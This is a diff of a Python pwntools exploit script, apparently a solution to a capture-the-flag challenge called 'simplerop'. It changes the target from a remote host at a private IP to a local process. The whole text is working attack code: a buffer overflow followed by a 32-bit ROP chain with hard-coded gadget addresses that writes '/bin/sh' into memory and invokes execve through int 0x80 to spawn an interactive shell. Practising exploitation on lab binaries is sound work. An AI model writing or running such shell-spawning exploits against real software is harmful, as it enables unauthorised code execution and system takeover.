@@ -1,45 +1,32 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-from pwnpwnpwn import *
 from pwn import *
 
-host = "10.211.55.28"
-port = 8888
-
-r = remote(host,port)
-
-gadget = 0x809a15d # mov dword ptr [edx], eax ; ret
-pop_eax_ret = 0x80bae06
-pop_edx_ret = 0x806e82a
-pop_edx_ecx_ebx = 0x0806e850
-pop_eax_ret = 0x080bae06
-buf = 0x80ea060
-int_80 = 0x80493e1
+io = process('./simplerop')
 
 #write to memory
-payload = "a"*32
-payload += p32(pop_edx_ret)
-payload += p32(buf)
-payload += p32(pop_eax_ret)
-payload += "/bin"
-payload += p32(gadget)
-payload += p32(pop_edx_ret)
-payload += p32(buf+4)
-payload += p32(pop_eax_ret)
-payload += "/sh\x00"
-payload += p32(gadget)
+p = 'a'*32
+p += p32(0x0806e82a) # pop edx ; ret
+p += p32(0x080ea060) # @ .data
+p += p32(0x080bae06) # pop eax ; ret
+p += '/bin'
+p += p32(0x0809a15d) # mov dword ptr [edx], eax ; ret
+p += p32(0x0806e82a) # pop edx ; ret
+p += p32(0x080ea064) # @ .data + 4
+p += p32(0x080bae06) # pop eax ; ret
+p += '/sh\x00'
+p += p32(0x0809a15d) # mov dword ptr [edx], eax ; ret
 
 #write to register
-payload += p32(pop_edx_ecx_ebx)
-payload += p32(0)
-payload += p32(0)
-payload += p32(buf)
-payload += p32(pop_eax_ret)
-payload += p32(0xb)
-payload += p32(int_80)
+p += p32(0x0806e850) # pop edx ; pop ecx ; pop ebx ; ret
+p += p32(0) # 0
+p += p32(0) # 0
+p += p32(0x080ea060) # @ .data
+p += p32(0x080bae06) # pop eax ; ret
+p += p32(0xb) # 0xb
+p += p32(0x080493e1) # int 0x80
+#syscall 0xb ==> execve(/bin/sh,0,0)
 
-print len(payload)
-r.recvuntil(":")
-r.sendline(payload)
-
-r.interactive()
+io.recvuntil("Your input :")
+io.sendline(p)
+io.interactive()
